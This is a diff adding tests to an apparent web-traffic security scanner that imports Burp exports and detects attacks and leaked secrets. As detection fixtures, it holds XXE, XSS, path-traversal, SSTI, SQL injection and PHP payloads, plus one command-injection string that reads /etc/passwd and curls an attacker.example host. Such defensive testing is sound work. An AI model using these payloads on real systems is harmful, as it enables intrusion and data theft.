@@ -334,9 +334,13 @@ def test_every_check_module_is_registered():
 
 
 def test_every_check_has_cases():
-    """Guard: the matrix must cover every registered check."""
-    missing_pos = [c for c in ALL_CHECKS if c not in POSITIVE]
-    missing_neg = [c for c in ALL_CHECKS if c not in NEGATIVE]
+    """Guard: the matrix must cover every registered check.
+
+    An empty case list is the same as no cases — `test_checks_positive` would
+    loop over nothing and pass — so the entry has to hold something.
+    """
+    missing_pos = [c for c in ALL_CHECKS if not POSITIVE.get(c)]
+    missing_neg = [c for c in ALL_CHECKS if not NEGATIVE.get(c)]
     assert not missing_pos, f"no positive cases for: {missing_pos}"
     assert not missing_neg, f"no negative cases for: {missing_neg}"
 
@@ -392,8 +396,10 @@ def test_encoded_payloads_detected(check, row, expect, run_check):
 def test_encoding_requires_decoded_columns(run_check):
     """Without decoded columns (legacy DB), the encoded payload is not seen."""
     row = dict(method="POST", body="d=" + b64("<?php system(1); ?>"))
-    findings = run_check("code", [row], decoded=False)
-    assert not any("#decoded" in f.location for f in findings)
+    assert run_check("code", [row], decoded=False) == []
+    # ... and the same row with the columns filled is a finding, so the case
+    # is the columns and not the payload.
+    assert run_check("code", [row])
 
 
 def test_decoded_view_helper():
@@ -622,6 +628,103 @@ def test_burp_import_then_scan_finds_encoded(tmp_path):
     assert any("#decoded" in f.location for f in findings)
 
 
+def test_burp_import_refuses_an_entity_bearing_export(tmp_path):
+    """The importer parses attacker-supplied XML; a DTD is the XXE surface.
+
+    This is the very hole the `xxe` check exists to report, so the tool must
+    not have it: an external entity has to be refused, not resolved and read
+    into the corpus.
+    """
+    import pytest
+
+    from cru import burp_to_sql
+
+    secret = tmp_path / "secret.txt"
+    secret.write_text("TOP-SECRET-LOCAL-FILE")
+    xml = tmp_path / "evil.xml"
+    xml.write_text(
+        '<?xml version="1.0"?>\n'
+        f'<!DOCTYPE items [<!ENTITY xxe SYSTEM "file://{secret}">]>\n'
+        "<items><item><host>app.test</host><path>/&xxe;</path>"
+        '<request base64="false"><![CDATA[GET / HTTP/1.1\nHost: app.test\n\n]]>'
+        "</request><status>200</status></item></items>"
+    )
+    db = tmp_path / "e.db"
+
+    with pytest.raises(Exception) as caught:
+        burp_to_sql.import_burp(str(xml), str(db))
+
+    assert "Entities" in type(caught.value).__name__ or "DTD" in str(caught.value)
+    if db.exists():
+        con = sqlite3.connect(str(db))
+        stored = con.execute("SELECT path FROM requests").fetchall()
+        con.close()
+        assert "TOP-SECRET-LOCAL-FILE" not in str(stored)
+
+
+def _burp_xml_bytes(request: bytes, response: bytes):
+    import base64
+
+    return (
+        '<?xml version="1.0"?><items><item>'
+        "<host>app.test</host><port>443</port><protocol>https</protocol>"
+        f'<request base64="true"><![CDATA[{base64.b64encode(request).decode()}]]>'
+        "</request><status>200</status>"
+        f'<response base64="true"><![CDATA[{base64.b64encode(response).decode()}]]>'
+        "</response></item></items>"
+    )
+
+
+def test_burp_import_decompresses_a_gzip_response(tmp_path):
+    """A proxy history stores what came off the wire, compressed and all.
+
+    Left compressed, the body is bytes nobody can scan — and the corpus keeps
+    a lossy text decode of them, so the secret in it would simply be gone.
+    """
+    import gzip
+
+    from cru import burp_to_sql
+
+    payload = b'{"k":"AKIAIOSFODNN7EXAMPLE"}'
+    body = gzip.compress(payload)
+    response = (
+        b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n"
+        b"Content-Encoding: gzip\r\n\r\n" + body
+    )
+    xml = tmp_path / "gz.xml"
+    xml.write_text(
+        _burp_xml_bytes(b"GET /a HTTP/1.1\r\nHost: app.test\r\n\r\n", response)
+    )
+    db = tmp_path / "gz.db"
+
+    burp_to_sql.import_burp(str(xml), str(db))
+
+    rows = ps.load_rows(str(db))
+    assert payload.decode() in rows[0]["response_body"]
+    findings = ps.build_checks("secrets")[0].run(rows)
+    assert any(f.signature == "aws-access-key-id" for f in findings)
+
+
+def test_burp_import_skips_an_item_with_no_request(tmp_path):
+    """A site-map export carries entries Burp never sent; they are not rows."""
+    from cru import burp_to_sql
+
+    xml = tmp_path / "partial.xml"
+    xml.write_text(
+        '<?xml version="1.0"?><items>'
+        "<item><host>app.test</host><path>/a</path></item>"
+        + _burp_xml_bytes(
+            b"GET /b HTTP/1.1\r\nHost: app.test\r\n\r\n",
+            b"HTTP/1.1 200 OK\r\n\r\nok",
+        ).split("<items>")[1]
+    )
+    db = tmp_path / "p.db"
+
+    total, skipped = burp_to_sql.import_burp(str(xml), str(db))
+
+    assert (total, skipped) == (1, 1)
+
+
 def test_report_json_html_roundtrip(tmp_path, make_db):
     from cru import report_html
 
@@ -682,21 +785,22 @@ def test_report_points_at_the_message_the_evidence_came_from(tmp_path, make_db):
 def test_idor_ids_are_listed_masked_and_bounded(tmp_path, make_db):
     """The observed IDs get their own listing, and are not a way round masking.
 
-    idor_finder treats a hinted body parameter as an identifier whatever is in
-    it, so a bearer token lands in `ids` — it has to be masked like any other
-    secret, and truncated or the listing is unreadable.
+    An "identifier" is sometimes a credential — idor_finder reads the value of
+    a hinted parameter whatever is in it — so a high-entropy one has to be
+    masked like any other secret, and a long one truncated or the listing is
+    unreadable.
     """
     from cru import report_html
 
-    db = tmp_path / "ids.db"
-    token = _jwt({"sub": "42"}) + "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+    secret_id = "edcm4pMbXDuCL1mHoOsFaQfDPrAJ71fTquWoGsbeKXgz"
+    long_id = "a3f9" * 30
     con = make_db(
         [
-            dict(path="/users/1", body=f"user_id=1&token={token}"),
-            dict(path="/users/2", body="user_id=2"),
-            dict(path="/users/3", body="user_id=3"),
+            dict(path="/users/1", method="POST", body=f'{{"user_id":"{secret_id}"}}'),
+            dict(path="/users/2", method="POST", body=f'{{"user_id":"{long_id}"}}'),
         ]
     )
+    db = tmp_path / "ids.db"
     disk = sqlite3.connect(str(db))
     con.backup(disk)
     disk.close()
@@ -706,8 +810,12 @@ def test_idor_ids_are_listed_masked_and_bounded(tmp_path, make_db):
 
     listed = [v for f in doc["findings"] for v in f["ids"]]
     assert listed, "no IDs listed for an enumerable endpoint"
-    assert all(len(v) <= report_html._ID_DISPLAY + 1 for v in listed)
-    assert token not in json.dumps(doc), "a credential escaped through ids"
+    # 80 characters and an ellipsis. Spelled out rather than read back from
+    # `_ID_DISPLAY`, which would pass whatever the cap were changed to.
+    assert all(len(v) <= 81 for v in listed), max(listed, key=len)
+    assert any(v.endswith("…") for v in listed), "the long id was not truncated"
+    assert secret_id not in json.dumps(doc), "a credential escaped through ids"
+    assert any("•" in v for v in listed), "the credential-shaped id was not masked"
 
 
 def test_a_finding_offers_the_decoded_view_of_its_own_field(tmp_path, make_db):
@@ -868,13 +976,16 @@ def test_report_message_offsets_survive_astral_characters(tmp_path, make_db):
     from cru import report_html
 
     db = tmp_path / "u.db"
-    con = make_db([dict(response_body='{"note":"\U0001f600","k":"sk-live-x"}')])
+    con = make_db(
+        [dict(response_body='{"note":"\U0001f600","k":"AKIAIOSFODNN7EXAMPLE"}')]
+    )
     disk = sqlite3.connect(str(db))
     con.backup(disk)
     disk.close()
 
     rows, findings, messages = report_html.collect(str(db), "requests", "secrets", True)
     doc = report_html.build_report_doc(rows, findings, {"db": str(db)}, messages)
+    checked = 0
     for rec in doc["findings"]:
         if not rec["match"]:
             continue
@@ -882,6 +993,11 @@ def test_report_message_offsets_survive_astral_characters(tmp_path, make_db):
         units = pane.encode("utf-16-le")
         sliced = units[rec["match"][0] * 2 : rec["match"][1] * 2].decode("utf-16-le")
         assert sliced == report_html._needle(rec["evidence"])
+        checked += 1
+    assert checked, "no located finding to check the offsets of"
+    # The emoji sits before the secret, so a byte- or codepoint-counted offset
+    # lands somewhere else entirely.
+    assert any(rec["match"] and rec["match"][0] > 0 for rec in doc["findings"])
 
 
 def test_report_masks_every_occurrence_not_just_the_one_reported(tmp_path, make_db):
@@ -1288,6 +1404,89 @@ def test_one_secret_is_one_finding_however_many_requests(run_check):
     assert merged.paths == ["GET /a", "GET /b"]
 
 
+def test_reflection_is_only_exploitable_when_it_comes_back_unencoded(run_check):
+    """Encoding is the fix, so a reflected-and-encoded payload is not the bug.
+
+    The payload is still worth noting as an input the app takes, but calling it
+    exploitable when the app escaped it is how a scanner earns its reputation.
+    """
+    payload = "<script>alert(1)</script>"
+    encoded = "&lt;script&gt;alert(1)&lt;/script&gt;"
+
+    unencoded_run = run_check(
+        "xss", [dict(query=f"q={payload}", response_body=f"echo {payload}")]
+    )
+    encoded_run = run_check(
+        "xss", [dict(query=f"q={payload}", response_body=f"echo {encoded}")]
+    )
+
+    assert any("reflected" in f.signature for f in unencoded_run)
+    assert not [f for f in encoded_run if "reflected" in f.signature], [
+        f.signature for f in encoded_run
+    ]
+    # ... the payload itself is still reported, at review.
+    assert any(f.signature.startswith("xss-payload:") for f in encoded_run)
+
+
+def test_traversal_escalates_when_the_file_comes_back(run_check):
+    """A `../` in an input is a guess; `root:x:0:0:` in the response is not.
+
+    The pair is what makes it worth acting on, so the finding has to say the
+    response confirmed it.
+    """
+    payload = "f=../../../../etc/passwd"
+    guess = run_check("traversal", [dict(query=payload)])
+    confirmed = run_check(
+        "traversal",
+        [dict(query=payload, response_body="root:x:0:0:root:/root:/bin/bash")],
+    )
+
+    assert guess and "file contents" not in guess[0].detail
+    assert confirmed and "file contents returned" in confirmed[0].detail
+
+
+def test_ssti_escalates_on_a_dangerous_token_inside_the_braces(run_check):
+    """`{{7*7}}` is a template; `{{config...}}` is someone reaching for RCE."""
+    plain = run_check("ssti", [dict(query="q={{7*7}}")])
+    dangerous = run_check(
+        "ssti", [dict(query="q={{config.__class__.__init__.__globals__}}")]
+    )
+
+    assert plain and "review for SSTI" in plain[0].detail
+    assert dangerous and "SSTI-sensitive token 'config'" in dangerous[0].detail
+
+
+def test_a_hit_visible_in_both_the_field_and_its_json_view_is_one_finding(run_check):
+    """`#json` re-presents text it shares with the field it came from.
+
+    The check that groups its findings would collapse them anyway; this is the
+    one that does not, so `key()` has to drop the suffix itself.
+    """
+    body = json.dumps({"note": "line\nline", "q": "<script>alert(1)</script>"})
+
+    findings = run_check("xss", [dict(method="POST", body=body)])
+
+    script = [f for f in findings if f.signature == "xss-payload:script-tag"]
+    assert len(script) == 1, [f.location for f in script]
+    assert script[0].location == "request-body", "reported against the field"
+
+
+def test_evidence_that_looks_like_markup_cannot_break_out_of_the_script_block():
+    """The report embeds its data as JSON inside <script>; `</script>` in a
+    finding would end the block and turn attacker text into markup.
+    """
+    from cru import report_html
+
+    doc = {"findings": [{"evidence": "</script><img src=x onerror=alert(1)>"}]}
+
+    embedded = report_html._safe_json(doc)
+
+    assert "<" not in embedded and ">" not in embedded and "&" not in embedded
+    assert "\\u003c" in embedded
+    # ... and it is still the same document once the browser parses it.
+    assert json.loads(embedded)["findings"][0]["evidence"].startswith("</script>")
+
+
 def test_ungrouped_findings_still_dedupe_per_path(run_check):
     """A check that does not group keeps path-level dedup."""
     payload = "<script>alert(1)</script>"
@@ -1322,6 +1521,21 @@ def test_progress_covers_a_longer_line_it_overwrites(monkeypatch, capsys):
     assert frames[-1].strip() == "", "the line is not left on screen"
 
 
+def test_progress_bar_fills_as_the_run_goes(monkeypatch, capsys):
+    """The bar is the only sign of life on a long scan; it has to move."""
+    from cru import progress
+
+    monkeypatch.setattr(progress, "_live", lambda: True)
+    progress.track(0, 4, "scanning")
+    progress.track(3, 4, "scanning")
+    progress.clear()
+
+    start, most, _ = capsys.readouterr().err.split("\r")[1:4]
+    assert "0/4 (  0%)" in start and start.count("#") == 0
+    assert "3/4 ( 75%)" in most
+    assert most.count("#") > start.count("#")
+
+
 def test_progress_is_silent_without_a_terminal(capsys):
     """`--json > findings.json` must not collect a thousand carriage returns."""
     from cru import progress
@@ -1336,6 +1550,250 @@ def test_progress_is_silent_without_a_terminal(capsys):
 
 
 # --------------------------------------------------------------------------- #
+# Runner surface: selection, output, loading
+# --------------------------------------------------------------------------- #
+
+
+def test_skip_leaves_the_named_checks_out_of_the_run():
+    """`--check all --skip secrets` is a full run minus one, not a single check."""
+    names = [c.name for c in ps.build_checks("all", skip=("secrets", "cors"))]
+
+    assert "secrets" not in names and "cors" not in names
+    assert set(names) == set(ALL_CHECKS) - {"secrets", "cors"}
+    # Skipping something a single --check did not select changes nothing.
+    assert [c.name for c in ps.build_checks("sqli", skip=("secrets",))] == ["sqli"]
+
+
+def test_present_redacts_the_secrets_check_and_nothing_else(run_check):
+    """Other checks quote payloads, and a redacted payload is unreadable."""
+    key = "AKIAIOSFODNN7EXAMPLE"
+    secrets = run_check("secrets", [dict(response_body=f'{{"k":"{key}"}}')])
+    payload = run_check("sqli", [dict(query="q=x' UNION SELECT a,b FROM users--")])
+
+    presented = ps._present(secrets + payload, show_secrets=False)
+
+    assert all(key not in f.evidence for f in presented if f.check == "secrets")
+    assert any("UNION SELECT" in f.evidence for f in presented if f.check == "sqli")
+
+
+def test_render_text_shows_the_paths_and_rules_behind_a_finding(run_check):
+    """A merged finding stands for several requests; the terminal has to say so."""
+    rows = [
+        dict(path="/a", response_body='{"k":"AKIAIOSFODNN7EXAMPLE"}'),
+        dict(path="/b", response_body='{"k":"AKIAIOSFODNN7EXAMPLE"}'),
+    ]
+    findings = [
+        f for f in run_check("secrets", rows) if f.signature == "aws-access-key-id"
+    ]
+
+    out = ps.render_text(findings)
+
+    assert "== secrets : 1 finding(s) ==" in out
+    assert "aws-access-key-id" in out
+    assert "paths : 2" in out and "GET /a" in out and "GET /b" in out
+    assert ps.render_text([]) == "No findings."
+
+
+def test_load_rows_reads_a_named_table_without_decoded_columns(tmp_path):
+    """A corpus built by another tool has neither the columns nor the name."""
+    db = tmp_path / "legacy.db"
+    con = sqlite3.connect(str(db))
+    con.execute(
+        "CREATE TABLE history (host TEXT, method TEXT, path TEXT, query TEXT,"
+        " cookies TEXT, headers TEXT, body TEXT, is_tls BOOLEAN,"
+        " response_status_code INTEGER, response_headers TEXT, response_body TEXT)"
+    )
+    con.execute(
+        "INSERT INTO history VALUES ('app.test','GET','/','q=<script>alert(1)</script>',"
+        "'','','',1,200,'','')"
+    )
+    con.commit()
+    con.close()
+
+    rows = ps.load_rows(str(db), "history")
+
+    assert len(rows) == 1 and rows[0]["host"] == "app.test"
+    assert "xss" in checks_of(ps.build_checks("xss")[0].run(rows))
+
+
+def test_entry_point_imports_a_burp_export(tmp_path):
+    """`python -m cru history.xml` has to take the XML path too."""
+    import cru.__main__ as entry
+
+    xml = tmp_path / "h.xml"
+    xml.write_text(_burp_xml([("GET", "/a", "", "HTTP/1.1 200 OK\r\n\r\nok")]))
+
+    db = entry.build_db(xml, None)
+
+    assert db == xml.with_suffix(".db")
+    assert len(ps.load_rows(str(db))) == 1
+
+
+# --------------------------------------------------------------------------- #
+# Bounds: the caps that keep one enormous field from costing the whole run
+# --------------------------------------------------------------------------- #
+
+
+def test_a_field_is_only_scanned_to_its_cap(run_check):
+    """`_MAX_FIELD` is what stops one 50MB response from owning the scan."""
+    from cru.checks.base import _MAX_FIELD
+
+    payload = "<?php system(1); ?>"
+    rows = [dict(method="POST", body="x" * (_MAX_FIELD + 10) + payload)]
+
+    assert run_check("code", rows) == []
+    assert run_check("code", [dict(method="POST", body=payload + "x" * 100)])
+
+
+def test_the_decoded_view_is_bounded_per_field():
+    """A response can carry a great many tokens; the expansion is capped."""
+    tokens = " ".join(_jwt({"sub": str(i)}) for i in range(field_decode._MAX_JWTS + 20))
+
+    view = field_decode.decoded_view(tokens)
+
+    # The expansion writes its dictionaries with `json.dumps` spacing, which
+    # is what tells an expanded token from the raw header the b64 pass decoded.
+    assert view.count('{"alg": "HS256"') == field_decode._MAX_JWTS
+    assert (
+        len(field_decode.decoded_view("x" * 10 + b64("A" * 10_000)))
+        <= field_decode._MAX
+    )
+
+
+def test_a_secret_quoted_in_a_finding_detail_is_masked(tmp_path, make_db):
+    """A JWT's claims go on the finding so two tokens can be told apart.
+
+    A claim can hold a credential, and the detail is rendered like any other
+    field — masking the panes and leaving the detail alone just moves the leak.
+    """
+    from cru import report_html
+
+    key = "AKIAIOSFODNN7EXAMPLE"
+    token = _jwt({"sub": "42", "api_key": key})
+    con = make_db([dict(headers=f"Authorization: Bearer {token}")])
+    db = tmp_path / "detail.db"
+    disk = sqlite3.connect(str(db))
+    con.backup(disk)
+    disk.close()
+
+    _rows, findings, messages = report_html.collect(str(db), "requests", "jwt", False)
+    doc = report_html.build_report_doc(_rows, findings, {"db": str(db)}, messages)
+
+    assert any(
+        "api_key" in f.detail for f in findings
+    ), "the claims are what the detail is for"
+    assert key not in json.dumps(doc), "a credential escaped through a detail"
+
+
+def test_host_level_findings_are_reported_once_per_host(run_check):
+    """A missing header is a property of the host, not of every URL on it.
+
+    Keeping the path would turn one configuration fault into one finding per
+    request, which is the whole reason those checks blank it before dedup.
+    """
+    rows = [
+        dict(
+            path=f"/p{i}", response_headers="Content-Type: text/html", response_body="x"
+        )
+        for i in range(5)
+    ]
+
+    findings = run_check("security-headers", rows)
+
+    assert findings, "no header findings to collapse"
+    assert all(f.path == "" for f in findings)
+    csp = [f for f in findings if f.signature == "missing-csp"]
+    assert len(csp) == 1, "one host, one missing-CSP finding"
+
+
+def test_a_finding_points_at_a_request_on_its_own_path(tmp_path, make_db):
+    """The same evidence can sit on many requests; the finding names one."""
+    from cru import report_html
+
+    payload = "<script>alert(1)</script>"
+    con = make_db(
+        [
+            dict(path="/first", query=f"q={payload}", response_body=payload),
+            dict(path="/second", query=f"q={payload}", response_body=payload),
+        ]
+    )
+    db = tmp_path / "loc.db"
+    disk = sqlite3.connect(str(db))
+    con.backup(disk)
+    disk.close()
+
+    _rows, findings, messages = report_html.collect(str(db), "requests", "xss", False)
+
+    for finding, (row, _pane, _match) in zip(findings, messages["locations"]):
+        if finding.path:
+            assert _rows[row]["path"] == finding.path, (
+                f"{finding.signature} on {finding.path} points at "
+                f"{_rows[row]['path']}"
+            )
+
+
+def test_a_report_pane_is_capped(tmp_path, make_db):
+    """The report embeds whole bodies; without a cap one row is the report."""
+    from cru import report_html
+
+    over = report_html._PANE_CAP + 5000
+    con = make_db([dict(method="POST", body="y" * over, response_body="z" * over)])
+    db = tmp_path / "big.db"
+    disk = sqlite3.connect(str(db))
+    con.backup(disk)
+    disk.close()
+
+    _rows, _findings, messages = report_html.collect(str(db), "requests", "xss", False)
+
+    panes = messages["panes"][0]
+    assert len(panes["request"]) == report_html._PANE_CAP
+    assert len(panes["response"]) == report_html._PANE_CAP
+
+
+def test_evidence_truncated_by_the_snippet_still_locates_in_the_pane(tmp_path, make_db):
+    """`_snippet` cuts evidence at 60 characters and marks the cut with an
+    ellipsis. That ellipsis is not in the message, so looking for the evidence
+    verbatim finds nothing and the finding loses its highlight.
+    """
+    from cru import report_html
+
+    command = "$(cat /etc/passwd && curl http://attacker.example/very/long/path?d=1)"
+    con = make_db([dict(method="POST", body=f"cmd={command}")])
+    db = tmp_path / "snip.db"
+    disk = sqlite3.connect(str(db))
+    con.backup(disk)
+    disk.close()
+
+    _rows, findings, messages = report_html.collect(str(db), "requests", "code", False)
+    shell = next(f for f in findings if f.signature == "code:shell (exec)")
+    assert shell.evidence.endswith("…"), "the case only exists for cut evidence"
+    assert len(shell.evidence) == 61
+
+    row, pane, match = messages["locations"][findings.index(shell)]
+    assert match, "truncated evidence was not located in its own message"
+    located = messages["panes"][row][pane][match[0] : match[1]]
+    assert located == shell.evidence.removesuffix("…")
+    assert command.startswith(located)
+
+
+def test_jwt_identity_ignores_the_claims_that_change_per_issue():
+    """Two tokens differing only in when they were minted are one credential."""
+    from cru.checks.base import jwt_identity
+
+    base_claims = {"sub": "42", "role": "admin"}
+    volatile = dict(base_claims, iat=1, exp=2, nbf=0, jti="a", auth_time=5, nonce="n")
+    again = dict(
+        base_claims, iat=900, exp=901, nbf=899, jti="b", auth_time=8, nonce="m"
+    )
+
+    assert jwt_identity(_jwt(volatile)) == jwt_identity(_jwt(again))
+    assert jwt_identity(_jwt(dict(base_claims, sub="43"))) != jwt_identity(
+        _jwt(base_claims)
+    )
+    assert jwt_identity("not.a.jwt") is None
+
+
+# --------------------------------------------------------------------------- #
 # Pattern gating and binary responses
 # --------------------------------------------------------------------------- #
 
@@ -1347,6 +1805,21 @@ def test_gate_skips_the_pattern_when_its_literal_is_absent():
     rx = gate(r"\bAKIA[0-9A-Z]{16}\b", "akia")
     assert rx.search("nothing here") is None
     assert rx.search("AKIAABCDEFGHIJKLMNOP") is not None
+
+
+def test_gate_literals_are_matched_whatever_the_case():
+    """The literals are the gate; a case-sensitive one would hide findings.
+
+    They are written lowercase, and the text is not: `AKIA...` has to reach the
+    pattern that names `akia`.
+    """
+    from cru.checks.base import gate
+
+    rx = gate(r"\bAKIA[0-9A-Z]{16}\b", "akia")
+    assert rx.search("key=AKIAABCDEFGHIJKLMNOP") is not None
+    # The gate really is doing the skipping, not the pattern.
+    assert rx._target("no key here")[0] is None
+    assert rx._target("key=AKIAABCDEFGHIJKLMNOP")[0] is not None
 
 
 def test_gate_matches_case_insensitively_and_keeps_the_original_case():
